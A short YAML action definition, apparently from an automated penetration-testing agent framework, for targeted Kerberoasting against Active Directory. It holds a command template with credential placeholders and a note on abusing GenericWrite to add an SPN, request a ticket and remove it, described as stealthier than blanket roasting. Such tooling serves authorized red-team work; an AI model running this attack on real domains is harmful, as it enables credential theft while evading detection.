name: targetedkerberoast
category: ad
description: Targeted Kerberoasting — set SPN then roast
preconditions:
  - domain_joined
  - has_cred
parameters:
  target_ip: from_engagement.target_ip
command_template: "python3 targetedKerberoast.py -u '{username}' -p '{password}' -d {domain} --dc-ip {target_ip}"
parser: null
expected_effects:
  - action_completed
falsifier:
  pattern: "error|failed|refused|denied"
  timeout: 30
model_tier: haiku
mechanism: "If you have GenericWrite on a user, add SPN to make them Kerberoastable, request TGS, then remove SPN. Stealthier than blanket Kerberoasting."
